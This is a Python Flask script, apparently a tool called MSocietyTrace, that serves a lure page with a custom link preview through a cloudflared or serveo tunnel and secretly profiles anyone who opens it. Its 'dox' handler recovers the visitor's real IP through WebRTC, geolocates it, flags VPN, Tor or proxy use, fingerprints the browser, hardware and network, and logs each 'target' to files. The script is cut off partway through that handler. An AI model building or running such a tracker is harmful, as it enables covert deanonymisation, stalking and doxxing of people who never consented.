import subprocess
from flask import Flask, jsonify, request, render_template, send_from_directory, send_file
import sys
import logging
import requests
from termcolor import colored
import json
import ipaddress
from werkzeug.middleware.proxy_fix import ProxyFix
from pwn import *
import signal
from colorama import init, Fore, Back, Style
import os
import time
import hashlib
import re
import uuid
import base64
from datetime import datetime

def def_handler(sig,frame):
    if forward_pid:
       subprocess.run(["kill", "-9", forward_pid])
    print("\nBye")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

init(autoreset=True)



def print_banner():
    banner_lines = [
        "            ______________¶¶¶",
        "           _____________¶¶_¶¶¶¶",
        "           ____________¶¶____¶¶¶",
        "           ___________¶¶¶______¶¶",
        "           ___________¶¶¶_______¶¶",
        "           ____________¶¶¶¶________¶¶",
        "           ____________¶_¶¶_________¶¶",
        "           ____________¶__¶¶_________¶¶____¶¶",
        "           ____________¶__¶¶__________¶¶¶¶¶¶¶",
        "           ___________¶¶__¶¶¶______¶¶¶¶¶¶¶___¶",
        "           ___________¶¶___¶¶__¶¶¶¶¶¶__¶¶",
        "           _________¶¶_¶____¶¶¶¶________¶¶",
        "           ________¶¶__¶¶___¶¶__________¶¶",
        "           _______¶¶____¶¶___¶¶__________¶¶",
        "           _______¶¶_______¶¶___¶¶_________¶¶",
        "           _______¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶_________¶",
        "           _¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶________¶¶",
        "           ¶¶__¶¶¶¶¶¶____¶¶¶¶¶¶¶¶¶¶______¶¶",
        "           ¶¶¶¶¶___¶______¶___¶¶¶¶¶¶_____¶¶",
        "           ________¶¶¶¶¶¶¶¶¶______¶¶¶¶¶_¶¶",
        "           ________¶¶¶¶¶¶¶¶¶¶¶________¶¶¶¶",
        "           ________¶¶¶¶¶¶¶¶¶¶¶¶",
        "           ________¶__¶¶_¶¶¶¶¶¶",
        "           _______¶¶______¶___¶",
        "           _______¶¶_____¶¶___¶",
        "           _______¶______¶¶___¶",
        "           ____¶¶______¶¶___¶¶",
        "           ____¶¶______¶¶___¶¶",
        "           ___¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶",
        "           __¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶¶",
        "           __¶¶________¶¶¶____¶¶",
        "           ____¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶"
    ]
    
    colors = [Fore.RED, Fore.LIGHTRED_EX, Fore.MAGENTA, Fore.LIGHTBLACK_EX, Fore.RESET]
    
    print(f"\n{Back.BLACK}{Style.BRIGHT}")
    
    for i, line in enumerate(banner_lines):
        color = colors[i % len(colors)]
        print(f"{color}{line}{Fore.RESET}")
    
    subtitle = "MSocietyTrace - SOCIAL TRACKING TOOL"
    print(f"\n{Fore.RED}{'='*65}{Fore.RESET}")
    print(f"{Fore.LIGHTRED_EX}[ {Fore.WHITE}{subtitle}{Fore.LIGHTRED_EX} ]{Fore.RESET}")
    print(f"{Fore.RED}{'='*65}{Fore.RESET}\n")
    
    print(f"{Fore.LIGHTBLACK_EX}┌─────────────────────────────────────────────────┐")
    print(f"{Fore.LIGHTBLACK_EX}│ {Fore.WHITE}Version: {Fore.LIGHTRED_EX}2.0{Fore.LIGHTBLACK_EX}{' '*41} │")
    print(f"{Fore.LIGHTBLACK_EX}│ {Fore.WHITE}Author:  {Fore.RED}SebSecRepos{Fore.LIGHTBLACK_EX}{' '*34} │")
    print(f"{Fore.LIGHTBLACK_EX}│ {Fore.WHITE}Type:     {Fore.LIGHTRED_EX}Security Tool{Fore.LIGHTBLACK_EX}{' '*33} │")
    print(f"{Fore.LIGHTBLACK_EX}│ {Fore.WHITE}Purpose:  {Fore.RED}Social Tracking{Fore.LIGHTBLACK_EX}{' '*32} │")
    print(f"{Fore.LIGHTBLACK_EX}└─────────────────────────────────────────────────┘{Fore.RESET}\n")

target_data = {}
session_id = str(uuid.uuid4())

logs_dir = os.path.join(os.getcwd(), 'logs')
if not os.path.exists(logs_dir):
    os.makedirs(logs_dir)

VPN_INDICATORS = [
    'vpn', 'proxy', 'tor', 'anonymous', 'hosting', 'data center', 'cloud',
    'aws', 'azure', 'google cloud', 'digital ocean', 'vultr', 'linode',
    'ovh', 'hetzner', 'scaleway', 'upcloud', 'rackspace', 'ibm cloud',
    'alibaba cloud', 'tencent cloud', 'oracle cloud', 'cloudflare', 'fastly',
    'akamai', 'limelight', 'level 3', 'centurylink', 'verizon', 'at&t',
    'comcast', 'cox', 'charter', 'spectrum', 'mediacom', 'wow'
]

TOR_PATTERNS = [
    r'tor', r'exit', r'relay', r'anonymous', r'privacy',
    r'guard', r'bridge', r'node', r'hidden'
]

HOSTING_PATTERNS = [
    r'amazon|aws|ec2|s3', r'google|gcp|gce', r'microsoft|azure',
    r'digitalocean|do.co', r'vultr|vultr.com', r'linode|linode.com',
    r'ovh|ovhcloud', r'hetzner|hetzner.com', r'scaleway|scw.cloud',
    r'upcloud|upcloud.com', r'rackspace|rackspace.com', r'ibm|ibmcloud',
    r'alibaba|aliyun', r'tencent|qcloud', r'oracle|oci',
    r'cloudflare|cf-', r'fastly', r'akamai', r'limelight'
]

PROXY_PATTERNS = [
    r'proxy', r'prx', r'anonymous', r'hide', r'guard',
    r'ninja', r'vpn', r'smart', r'speed', r'ultra'
]

def detect_vpn_proxy_tor(ip, user_agent, isp, org):
    indicators = {
        'is_vpn': False,
        'is_proxy': False,
        'is_tor': False,
        'is_datacenter': False,
        'is_hosting': False,
        'confidence': 0,
        'reasons': []
    }
    
    if not isp:
        isp = ""
    if not org:
        org = ""
    if not user_agent:
        user_agent = ""
    
    isp_lower = isp.lower()
    org_lower = org.lower()
    ua_lower = user_agent.lower()
    
    if 'tor browser' in ua_lower:
        indicators['is_tor'] = True
        indicators['confidence'] += 50
        indicators['reasons'].append("Tor Browser detected in User-Agent")
    
    vpn_matches = []
    for indicator in VPN_INDICATORS:
        if indicator in isp_lower:
            vpn_matches.append(f"ISP: {indicator}")
            indicators['confidence'] += 15
        if indicator in org_lower:
            vpn_matches.append(f"ORG: {indicator}")
            indicators['confidence'] += 15
    
    if vpn_matches:
        indicators['is_vpn'] = True
        indicators['reasons'].extend(vpn_matches)
    
    for pattern in HOSTING_PATTERNS:
        if re.search(pattern, isp_lower + ' ' + org_lower):
            indicators['is_hosting'] = True
            indicators['is_datacenter'] = True
            indicators['confidence'] += 25
            indicators['reasons'].append(f"Hosting provider detected: {pattern}")
    
    for pattern in PROXY_PATTERNS:
        if re.search(pattern, isp_lower + ' ' + org_lower + ' ' + ua_lower):
            indicators['is_proxy'] = True
            indicators['confidence'] += 20
            indicators['reasons'].append(f"Proxy pattern detected: {pattern}")
    
    for pattern in TOR_PATTERNS:
        if re.search(pattern, isp_lower + ' ' + org_lower):
            indicators['is_tor'] = True
            indicators['confidence'] += 30
            indicators['reasons'].append(f"Tor pattern detected: {pattern}")
    
    try:
        ip_obj = ipaddress.ip_address(ip)
        
        if ip_obj.is_private:
            indicators['is_proxy'] = True
            indicators['confidence'] += 20
            indicators['reasons'].append("Private IP address detected")
        
        if ip_obj.is_reserved:
            indicators['is_proxy'] = True
            indicators['confidence'] += 15
            indicators['reasons'].append("Reserved IP range detected")
            
    except ValueError:
        indicators['confidence'] += 10
        indicators['reasons'].append("Invalid IP format")
    
    vpn_ports = ['1194', '443', '8080', '500', '4500']
    for port in vpn_ports:
        if port in org_lower or port in isp_lower:
            indicators['is_vpn'] = True
            indicators['confidence'] += 10
            indicators['reasons'].append(f"VPN port {port} detected")
    
    if 'gbps' in org_lower or 'mbps' in org_lower or 'bandwidth' in org_lower:
        indicators['is_hosting'] = True
        indicators['confidence'] += 15
        indicators['reasons'].append("Bandwidth provider detected")
    
    indicators['confidence'] = min(indicators['confidence'], 100)
    
    if indicators['confidence'] >= 30:
        if indicators['is_tor'] or 'tor' in ' '.join(indicators['reasons']).lower():
            indicators['is_tor'] = True
        if indicators['is_vpn'] or 'vpn' in ' '.join(indicators['reasons']).lower():
            indicators['is_vpn'] = True
        if indicators['is_proxy'] or 'proxy' in ' '.join(indicators['reasons']).lower():
            indicators['is_proxy'] = True
    
    return indicators

def advanced_browser_fingerprinting(user_agent, screen_resolution, timezone, language):
    fingerprint = {
        'browser_type': 'unknown',
        'browser_version': 'unknown',
        'os': 'unknown',
        'device_type': 'unknown',
        'is_mobile': False,
        'is_bot': False,
        'privacy_level': 'low',
        'fingerprint_hash': None
    }
    
    ua_lower = user_agent.lower()
    if 'chrome' in ua_lower and 'edg' not in ua_lower:
        fingerprint['browser_type'] = 'Chrome'
    elif 'firefox' in ua_lower:
        fingerprint['browser_type'] = 'Firefox'
    elif 'safari' in ua_lower and 'chrome' not in ua_lower:
        fingerprint['browser_type'] = 'Safari'
    elif 'edg' in ua_lower:
        fingerprint['browser_type'] = 'Edge'
    elif 'opera' in ua_lower or 'opr' in ua_lower:
        fingerprint['browser_type'] = 'Opera'
    
    if 'windows' in ua_lower:
        fingerprint['os'] = 'Windows'
        if 'phone' in ua_lower or 'mobile' in ua_lower:
            fingerprint['device_type'] = 'Mobile'
        else:
            fingerprint['device_type'] = 'Desktop'
    elif 'android' in ua_lower:
        fingerprint['os'] = 'Android'
        fingerprint['device_type'] = 'Mobile'
        fingerprint['is_mobile'] = True
    elif 'ios' in ua_lower or 'iphone' in ua_lower or 'ipad' in ua_lower:
        fingerprint['os'] = 'iOS'
        fingerprint['device_type'] = 'Mobile'
        fingerprint['is_mobile'] = True
    elif 'linux' in ua_lower:
        fingerprint['os'] = 'Linux'
        fingerprint['device_type'] = 'Desktop'
    elif 'mac os' in ua_lower:
        fingerprint['os'] = 'macOS'
        fingerprint['device_type'] = 'Desktop'
    
    bot_patterns = ['bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'python']
    for pattern in bot_patterns:
        if pattern in ua_lower:
            fingerprint['is_bot'] = True
            fingerprint['privacy_level'] = 'high'
            break
    
    if 'tor' in ua_lower or 'vpn' in ua_lower or 'anonymous' in ua_lower:
        fingerprint['privacy_level'] = 'high'
    elif fingerprint['browser_type'] in ['Firefox', 'Tor Browser']:
        fingerprint['privacy_level'] = 'medium'
    
    fingerprint_data = f"{user_agent}_{screen_resolution}_{timezone}_{language}"
    fingerprint['fingerprint_hash'] = hashlib.sha256(fingerprint_data.encode()).hexdigest()[:16]
    
    return fingerprint

def hardware_detection(screen_info, webgl_info, canvas_info):
    hardware = {
        'gpu_vendor': 'unknown',
        'gpu_renderer': 'unknown',
        'screen_resolution': 'unknown',
        'color_depth': 'unknown',
        'pixel_ratio': 'unknown',
        'webgl_supported': False,
        'canvas_fingerprint': None,
        'hardware_score': 0
    }
    
    if screen_info:
        hardware['screen_resolution'] = screen_info.get('resolution', 'unknown')
        hardware['color_depth'] = screen_info.get('colorDepth', 'unknown')
        hardware['pixel_ratio'] = screen_info.get('pixelRatio', 'unknown')
    
    if webgl_info:
        hardware['webgl_supported'] = True
        hardware['gpu_vendor'] = webgl_info.get('vendor', 'unknown')
        hardware['gpu_renderer'] = webgl_info.get('renderer', 'unknown')
        hardware['hardware_score'] += 30
    
    if canvas_info:
        hardware['canvas_fingerprint'] = canvas_info.get('fingerprint', 'unknown')
        hardware['hardware_score'] += 20
    
    return hardware

def network_analysis(connection_info, timing_data):
    analysis = {
        'connection_type': 'unknown',
        'effective_bandwidth': 'unknown',
        'latency': 'unknown',
        'packet_loss': 'unknown',
        'is_wifi': False,
        'is_mobile': False,
        'network_quality': 'unknown'
    }
    
    if connection_info:
        analysis['connection_type'] = connection_info.get('type', 'unknown')
        analysis['effective_bandwidth'] = connection_info.get('downlink', 'unknown')
        
        if connection_info.get('type') == 'cellular':
            analysis['is_mobile'] = True
            analysis['network_quality'] = 'mobile'
        elif connection_info.get('type') == 'wifi':
            analysis['is_wifi'] = True
            analysis['network_quality'] = 'wifi'
        else:
            analysis['network_quality'] = 'wired'
    
    if timing_data:
        analysis['latency'] = timing_data.get('rtt', 'unknown')
    
    return analysis

def export_data_json(data, filename=None):
    import os
    
    logs_dir = os.path.join(os.getcwd(), 'logs')
    if not os.path.exists(logs_dir):
        os.makedirs(logs_dir)
    
    if not filename:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"msocietytrace_{timestamp}.json"
    
    filepath = os.path.join(logs_dir, filename)
    
    with open(filepath, 'w') as f:
        json.dump(data, f, indent=2, default=str)
    
    return filepath

def export_data_csv(data, filename=None):
    import csv
    import os
    
    logs_dir = os.path.join(os.getcwd(), 'logs')
    if not os.path.exists(logs_dir):
        os.makedirs(logs_dir)
    
    if not filename:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"msocietytrace_{timestamp}.csv"
    
    filepath = os.path.join(logs_dir, filename)
    
    flattened = {}
    for key, value in data.items():
        if isinstance(value, dict):
            for sub_key, sub_value in value.items():
                flattened[f"{key}_{sub_key}"] = sub_value
        else:
            flattened[key] = value
    
    with open(filepath, 'w', newline='') as f:
        writer = csv.DictWriter(f, fieldnames=flattened.keys())
        writer.writeheader()
        writer.writerow(flattened)
    
    return filepath

def export_all_targets():
    import os
    
    logs_dir = os.path.join(os.getcwd(), 'logs')
    if not os.path.exists(logs_dir):
        os.makedirs(logs_dir)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"msocietytrace_all_targets_{timestamp}.json"
    filepath = os.path.join(logs_dir, filename)
    
    with open(filepath, 'w') as f:
        json.dump({
            'session_id': session_id,
            'export_time': datetime.now().isoformat(),
            'total_targets': len(target_data),
            'targets': target_data
        }, f, indent=2, default=str)
    
    return filepath

def print_advanced_analysis(data):
    print(f"\n{Fore.LIGHTRED_EX}{'='*80}{Fore.RESET}")
    print(f"{Fore.RED}[{Fore.WHITE}ADVANCED ANALYSIS{Fore.RED}]{Fore.RESET}")
    print(f"{Fore.LIGHTRED_EX}{'='*80}{Fore.RESET}")
    
    if 'vpn_analysis' in data:
        vpn_data = data['vpn_analysis']
        print(f"\n{Fore.LIGHTBLACK_EX}[{Fore.WHITE}VPN/PROXY/TOR DETECTION{Fore.LIGHTBLACK_EX}]{Fore.RESET}")
        print(f"{Fore.LIGHTBLACK_EX}  VPN Detected: {Fore.RED}{vpn_data.get('is_vpn', False)}{Fore.RESET}")
        print(f"{Fore.LIGHTBLACK_EX}  Proxy Detected: {Fore.RED}{vpn_data.get('is_proxy', False)}{Fore.RESET}")
        print(f"{Fore.LIGHTBLACK_EX}  Tor Detected: {Fore.RED}{vpn_data.get('is_tor', False)}{Fore.RESET}")
        print(f"{Fore.LIGHTBLACK_EX}  Datacenter: {Fore.RED}{vpn_data.get('is_datacenter', False)}{Fore.RESET}")
        print(f"{Fore.LIGHTBLACK_EX}  Confidence: {Fore.RED}{vpn_data.get('confidence', 0)}%{Fore.RESET}")
        if vpn_data.get('reasons'):
            print(f"{Fore.LIGHTBLACK_EX}  Reasons: {Fore.WHITE}{', '.join(vpn_data['reasons'])}{Fore.RESET}")
    
    if 'browser_fingerprint' in data:
        fp_data = data['browser_fingerprint']
        print(f"\n{Fore.LIGHTBLACK_EX}[{Fore.WHITE}BROWSER FINGERPRINT{Fore.LIGHTBLACK_EX}]{Fore.RESET}")
        print(f"{Fore.LIGHTBLACK_EX}  Browser: {Fore.RED}{fp_data.get('browser_type', 'unknown')}{Fore.RESET}")
        print(f"{Fore.LIGHTBLACK_EX}  OS: {Fore.RED}{fp_data.get('os', 'unknown')}{Fore.RESET}")
        print(f"{Fore.LIGHTBLACK_EX}  Device: {Fore.RED}{fp_data.get('device_type', 'unknown')}{Fore.RESET}")
        print(f"{Fore.LIGHTBLACK_EX}  Mobile: {Fore.RED}{fp_data.get('is_mobile', False)}{Fore.RESET}")
        print(f"{Fore.LIGHTBLACK_EX}  Bot: {Fore.RED}{fp_data.get('is_bot', False)}{Fore.RESET}")
        print(f"{Fore.LIGHTBLACK_EX}  Privacy Level: {Fore.RED}{fp_data.get('privacy_level', 'unknown')}{Fore.RESET}")
        print(f"{Fore.LIGHTBLACK_EX}  Fingerprint Hash: {Fore.RED}{fp_data.get('fingerprint_hash', 'unknown')}{Fore.RESET}")
    
    if 'hardware_info' in data:
        hw_data = data['hardware_info']
        print(f"\n{Fore.LIGHTBLACK_EX}[{Fore.WHITE}HARDWARE DETECTION{Fore.LIGHTBLACK_EX}]{Fore.RESET}")
        print(f"{Fore.LIGHTBLACK_EX}  GPU Vendor: {Fore.RED}{hw_data.get('gpu_vendor', 'unknown')}{Fore.RESET}")
        print(f"{Fore.LIGHTBLACK_EX}  GPU Renderer: {Fore.RED}{hw_data.get('gpu_renderer', 'unknown')}{Fore.RESET}")
        print(f"{Fore.LIGHTBLACK_EX}  Screen Resolution: {Fore.RED}{hw_data.get('screen_resolution', 'unknown')}{Fore.RESET}")
        print(f"{Fore.LIGHTBLACK_EX}  Color Depth: {Fore.RED}{hw_data.get('color_depth', 'unknown')}{Fore.RESET}")
        print(f"{Fore.LIGHTBLACK_EX}  WebGL Support: {Fore.RED}{hw_data.get('webgl_supported', False)}{Fore.RESET}")
        print(f"{Fore.LIGHTBLACK_EX}  Canvas Fingerprint: {Fore.RED}{hw_data.get('canvas_fingerprint', 'unknown')[:16]}...{Fore.RESET}")
        print(f"{Fore.LIGHTBLACK_EX}  Hardware Score: {Fore.RED}{hw_data.get('hardware_score', 0)}{Fore.RESET}")
    
    if 'network_analysis' in data:
        net_data = data['network_analysis']
        print(f"\n{Fore.LIGHTBLACK_EX}[{Fore.WHITE}NETWORK ANALYSIS{Fore.LIGHTBLACK_EX}]{Fore.RESET}")
        print(f"{Fore.LIGHTBLACK_EX}  Connection Type: {Fore.RED}{net_data.get('connection_type', 'unknown')}{Fore.RESET}")
        print(f"{Fore.LIGHTBLACK_EX}  Bandwidth: {Fore.RED}{net_data.get('effective_bandwidth', 'unknown')}{Fore.RESET}")
        print(f"{Fore.LIGHTBLACK_EX}  Latency: {Fore.RED}{net_data.get('latency', 'unknown')}{Fore.RESET}")
        print(f"{Fore.LIGHTBLACK_EX}  WiFi: {Fore.RED}{net_data.get('is_wifi', False)}{Fore.RESET}")
        print(f"{Fore.LIGHTBLACK_EX}  Mobile Network: {Fore.RED}{net_data.get('is_mobile', False)}{Fore.RESET}")
        print(f"{Fore.LIGHTBLACK_EX}  Network Quality: {Fore.RED}{net_data.get('network_quality', 'unknown')}{Fore.RESET}")
    
    print(f"\n{Fore.LIGHTRED_EX}{'='*80}{Fore.RESET}\n")

log = logging.getLogger('werkzeug')
log.disabled = True

app = Flask(__name__)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1)


def test_tools():
    system_tools=["ssh", "cloudflared"]
    
    for tool in system_tools:
        if subprocess.run(["which", tool], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL ).returncode == 1:
            print(f"{Fore.RED}[!] {Fore.WHITE}{tool}{Fore.RED} not installed{Fore.RESET}")
            sys.exit(1)


def ip_api(ip):
    global selected_api
    
    req = requests.get(f"http://ip-api.com/json/{ip}")
    geo_data = json.loads(req.text)
    
    print(f"{Fore.LIGHTBLACK_EX}\tcountry: {Fore.WHITE}"+f"{Fore.RED}{geo_data.get('country')}{Fore.RESET}")
    print(f"{Fore.LIGHTBLACK_EX}\tregionName: {Fore.WHITE}"+f"{Fore.RED}{geo_data.get('regionName')}{Fore.RESET}")
    print(f"{Fore.LIGHTBLACK_EX}\tcity: {Fore.WHITE}"+f"{Fore.RED}{geo_data.get('city')}{Fore.RESET}")
    print(f"{Fore.LIGHTBLACK_EX}\tzip: {Fore.WHITE}"+f"{Fore.RED}{geo_data.get('zip')}{Fore.RESET}")
    print(f"{Fore.LIGHTBLACK_EX}\tlat: {Fore.WHITE}"+f"{Fore.RED}{geo_data.get('lat')}{Fore.RESET}")
    print(f"{Fore.LIGHTBLACK_EX}\tlon: {Fore.WHITE}"+f"{Fore.RED}{geo_data.get('lon')}{Fore.RESET}")
    print(f"{Fore.LIGHTBLACK_EX}\tisp: {Fore.WHITE}"+f"{Fore.RED}{geo_data.get('isp')}{Fore.RESET}")
    print(f"{Fore.LIGHTBLACK_EX}\tas: {Fore.WHITE}"+f"{Fore.RED}{geo_data.get('as')}{Fore.RESET}")
    

def ipapi(ip):
    global selected_api
    req = requests.get(f"http://ipapi.co/{ip}/json")
    geo_data = json.loads(req.text)
    
    print(f"{Fore.LIGHTBLACK_EX}\tcountry_name: {Fore.WHITE}"+f"{Fore.RED}{geo_data.get('country_name')}{Fore.RESET}")
    print(f"{Fore.LIGHTBLACK_EX}\tregion: {Fore.WHITE}"+f"{Fore.RED}{geo_data.get('region')}{Fore.RESET}")
    print(f"{Fore.LIGHTBLACK_EX}\tcity: {Fore.WHITE}"+f"{Fore.RED}{geo_data.get('city')}{Fore.RESET}")
    print(f"{Fore.LIGHTBLACK_EX}\tpostal: {Fore.WHITE}"+f"{Fore.RED}{geo_data.get('postal')}{Fore.RESET}")
    print(f"{Fore.LIGHTBLACK_EX}\tlatitude: {Fore.WHITE}"+f"{Fore.RED}{geo_data.get('latitude')}{Fore.RESET}")
    print(f"{Fore.LIGHTBLACK_EX}\tlongitude: {Fore.WHITE}"+f"{Fore.RED}{geo_data.get('longitude')}{Fore.RESET}")
    print(f"{Fore.LIGHTBLACK_EX}\torg: {Fore.WHITE}"+f"{Fore.RED}{geo_data.get('org')}{Fore.RESET}")
    print(f"{Fore.LIGHTBLACK_EX}\tasn: {Fore.WHITE}"+f"{Fore.RED}{geo_data.get('asn')}{Fore.RESET}")
    
    


def set_variables():
    global image_url
    global title
    global port
    global selected_api
    global forwarding_service
    
    image_url= input(f"{Fore.LIGHTBLACK_EX}[+] {Fore.WHITE}Image url for link preview {Fore.LIGHTRED_EX}(Press enter to leave blank){Fore.WHITE}: ")
    title = input(f"{Fore.LIGHTBLACK_EX}[+] {Fore.WHITE}Page title: {Fore.LIGHTRED_EX}(Press enter to leave blank){Fore.WHITE}")
    
    try:
        port = input(f"{Fore.LIGHTBLACK_EX}[+] {Fore.WHITE}Local port for run server{Fore.WHITE}: ")
        port = int(port)
    except:
        print(f"\n{Fore.RED}[!] {Fore.WHITE}Invalid port")
        
    if not port or port < 1 or port > 65535:
        print(f"\n{Fore.RED}[!] {Fore.WHITE}Invalid port")
        sys.exit(1)
        
    try:
        for key,api in geo_apis.items():
            print(f"{Fore.LIGHTBLACK_EX}\t [{Fore.WHITE}{key}{Fore.LIGHTBLACK_EX}] {Fore.RED}{api['domain']}{Fore.RESET}")
            
        selected_api = int(input(f"{Fore.LIGHTBLACK_EX}[+] {Fore.WHITE}Select api for geolocation{Fore.WHITE}: \n"))
        selected_api = geo_apis[str(selected_api)]
        
    except Exception as e:
        print(e)
        print(f"{Fore.RED}[!] {Fore.WHITE}Select a valid number")
        sys.exit(1)
    
    try:
        for key,api in forwarding_services.items():
            print(f"{Fore.LIGHTBLACK_EX}\t [{Fore.WHITE}{key}{Fore.LIGHTBLACK_EX}] {Fore.RED}{api['service']}{Fore.RESET}")
            
        forwarding_service = int(input(f"{Fore.LIGHTBLACK_EX}[+] {Fore.WHITE}Select forwarding service{Fore.WHITE}: \n"))
        forwarding_service = forwarding_services[str(forwarding_service)]
        
    except Exception as e:
        print(e)
        print(f"{Fore.RED}[!] {Fore.WHITE}Select a valid number")
        sys.exit(1)
    
    print("\n")
    
def cloudflared():
    try:
        global port
        global forward_pid
        global forward_process
        global url
        
        forward_process = process(
            ["/usr/local/bin/cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
            stdin=PTY,
            stdout=PTY
        )

        forward_pid = forward_process.pid

        buffer = b""

        while True:
            chunk = forward_process.recv(timeout=0.5)

            if chunk:
                buffer += chunk

                match = re.search(rb"https://[a-zA-Z0-9\-]+\.trycloudflare\.com", buffer)
                if match:
                    url = match.group().decode()
                    print(f"\nTunnel URL: {Fore.LIGHTRED_EX}{url}{Fore.RESET}")
                    break

    except Exception as e:
        print(e)
                
def serveo():
    try:
        global port
        global forward_pid
        global forward_process
        global url
        
        forward_process = process(
            ["ssh", "-R", f"80:localhost:{port}", "serveo.net"],
            stdin=PTY,
            stdout=PTY
        )

        forward_pid = forward_process.pid

        buffer = b""

        while True:
            chunk = forward_process.recv(timeout=0.5)

            if chunk:
                buffer += chunk

                match = re.search(rb"https://[a-zA-Z0-9\-]+\.serveousercontent\.com", buffer)
                if match:
                    url = match.group().decode()
                    print(f"\nTunnel URL: {Fore.LIGHTRED_EX}{url}{Fore.RESET}")
                    break

    except Exception as e:
        print(e)
    
geo_apis={
    "0":{
        "domain":"ipapi.co",
        "geo_func":ipapi
    },
    "1":{
        "domain":"ip-api.com (Recomended)",
        "geo_func":ip_api
    }
}
    
forwarding_services={
    "0":{
        "service":"cloudflared (Recomended)",
        "forward_func":cloudflared
    },
    "1":{
        "service":"serveo.net",
        "forward_func":serveo
    }
}
def target_browser_rtc_info(target):
    print(f"{Fore.LIGHTBLACK_EX}\tIPv4: {Fore.WHITE}"+f"{Fore.RED}{target['ipv4']}{Fore.RESET}")
    print(f"{Fore.LIGHTBLACK_EX}\tIPv6: {Fore.WHITE}"+f"{Fore.RED}{target['ipv6']}{Fore.RESET}")
    print(f"{Fore.LIGHTBLACK_EX}\tUA: {Fore.WHITE}"+f"{Fore.RED}{target['navigator.userAgent']}{Fore.RESET}")
    print(f"{Fore.LIGHTBLACK_EX}\tOS2: {Fore.WHITE}"+f"{Fore.RED}{target['navigator.platform']}{Fore.RESET}")
def target_browser_info(target, ip):
    print(f"{Fore.LIGHTBLACK_EX}\tIP: {Fore.WHITE}"+f"{Fore.RED}{ip}{Fore.RESET}")
    print(f"{Fore.LIGHTBLACK_EX}\tUA: {Fore.WHITE}"+f"{Fore.RED}{target['navigator.userAgent']}{Fore.RESET}")
    print(f"{Fore.LIGHTBLACK_EX}\tOS2: {Fore.WHITE}"+f"{Fore.RED}{target['navigator.platform']}{Fore.RESET}")

@app.after_request
def add_headers(response):
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization"
    response.headers["Access-Control-Allow-Methods"] = "GET, POST, PUT, DELETE, OPTIONS"
    return response



@app.route('/', methods=['GET'])
def home():
    global image_url
    global title
    global local_port
    return render_template(
        "index.html",
        title=title,
        image_url=image_url
    )
    
@app.route('/', methods=['POST'])
def dox():
    global selected_api
    global url
    form_data = dict(request.form)
    
    if request.form.get("is_rtc") == "true":
        ip = request.form.get("ipv4")
        connection_method = "WebRTC"
        print(f"{Fore.LIGHTBLACK_EX}\n[ {Fore.WHITE}New target via WebRTC{Fore.LIGHTBLACK_EX} ]{Fore.WHITE} "+f"[ {Fore.RED}{url} {Fore.WHITE}]:\n")
        target_browser_rtc_info(request.form)
    else:
        ip = request.remote_addr
        connection_method = "HTTP"
        print(f"{Fore.LIGHTBLACK_EX}\n[ {Fore.WHITE}New target{Fore.LIGHTBLACK_EX} ]{Fore.WHITE} "+f"[ {Fore.RED}{url} {Fore.WHITE}]:\n")
        print(f"{Fore.RED}[!] {Fore.WHITE}Client side WebRTC failed, tracking via request remote addr{Fore.WHITE} "+f"({Fore.LIGHTBLACK_EX}Client could be using TOR or is blocking UDP or STUN Traffic{Fore.WHITE}\n")
        target_browser_info(request.form, ip)
    
    # Get basic geolocation
    geo_data = {}
    try:
        if selected_api["geo_func"] == ip_api:
            req = requests.get(f"http://ip-api.com/json/{ip}")
            geo_data = json.loads(req.text)
        else:
            req = requests.get(f"http://ipapi.co/{ip}/json")
            geo_data = json.loads(req.text)
    except:
        geo_data = {}
    
    # Advanced VPN/Proxy/Tor detection
    vpn_analysis = detect_vpn_proxy_tor(
        ip, 
        request.form.get("navigator.userAgent", ""),
        geo_data.get("isp", ""),
        geo_data.get("org", "")
    )
    
    # Advanced browser fingerprinting
    browser_fingerprint = advanced_browser_fingerprinting(
        request.form.get("navigator.userAgent", ""),
        request.form.get("screen.resolution", ""),
        request.form.get("timezone", ""),
        request.form.get("language", "")
    )
    
    # Hardware detection (if available)
    hardware_info = {}
    if request.form.get("screen.width"):
        screen_info = {
            'resolution': f"{request.form.get('screen.width')}x{request.form.get('screen.height')}",
            'colorDepth': request.form.get('screen.colorDepth'),
            'pixelRatio': request.form.get('screen.pixelRatio')
        }
        webgl_info = {
            'vendor': request.form.get('webgl.vendor'),
            'renderer': request.form.get('webgl.renderer')
        }
        canvas_info = {
            'fingerprint': request.form.get('canvas.fingerprint')
        }
        hardware_info = hardware_detection(screen_info, webgl_info, canvas_info)
    
    # Network analysis
    network_info = {}
    if request.form.get("connection.type"):
        connection_data = {
            'type': request.form.get("connection.type"),
            'downlink': request.form.get("connection.downlink")
        }
        timing_data = {
            'rtt': request.form.get("timing.rtt")
        }
        network_info = network_analysis(connection_data, timing_data)
    
    # Compile complete target data
    complete_data = {
        'timestamp': datetime.now().isoformat(),
        'session_id': session_id,
        'connection_method': connection_method,
        'ip': ip,
        'ipv6': request.form.get("ipv6"),
        'user_agent': request.form.get("navigator.userAgent"),
        'platform': request.form.get("navigator.platform"),
        'geolocation': geo_data,
        'vpn_analysis': vpn_analysis,
        'browser_fingerprint': browser_fingerprint,
        'hardware_info': hardware_info,
        'network_analysis': network_info,
        'raw_data': form_data
    }
    
    # Store target data
    target_id = hashlib.md5(f"{ip}_{datetime.now().isoformat()}".encode()).hexdigest()[:8]
    target_data[target_id] = complete_data
    
    # Print basic geolocation
    selected_api["geo_func"](ip)
    
    # Print advanced analysis
    print_advanced_analysis(complete_data)
    
    # Auto-export data
    try:
        json_file = export_data_json(complete_data)
